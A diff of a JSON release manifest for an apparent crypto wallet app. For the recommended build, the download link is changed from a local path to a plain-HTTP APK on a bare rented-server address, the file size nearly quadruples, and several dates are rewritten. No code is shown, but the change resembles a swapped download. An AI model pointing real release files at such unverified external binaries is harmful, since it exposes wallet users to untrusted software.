@@ -1,22 +1,22 @@
 [
   {
     "id": "latest",
-    "version": "1.0.1-beta",
-    "date": "2024-01-15",
-    "size": "28.5 MB",
+    "version": "1.0.2-beta",
+    "date": "2025-08-01",
+    "size": "121.7 MB",
     "description": "Latest beta release with enhanced security and social features",
     "changes": [
       "Improved social-fi token discovery",
       "Enhanced wallet security protocols",
       "Bug fixes and performance improvements"
     ],
-    "downloadUrl": "/downloads/cellar-1.2.0.apk",
+    "downloadUrl": "http://static.53.190.27.37.clients.your-server.de/solana-app/app-release-v1.0.2-beta.apk",
     "isRecommended": true
   },
   {
     "id": "beta",
     "version": "1.0.1-beta",
-    "date": "2024-01-20",
+    "date": "2025-07-28",
     "size": "29.1 MB",
     "description": "Beta release with experimental features",
     "changes": [
@@ -31,7 +31,7 @@
   {
     "id": "stable",
     "version": "1.0.0-beta",
-    "date": "2024-01-10",
+    "date": "2025-07-28",
     "size": "27.8 MB",
     "description": "Previous stable release",
     "changes": [
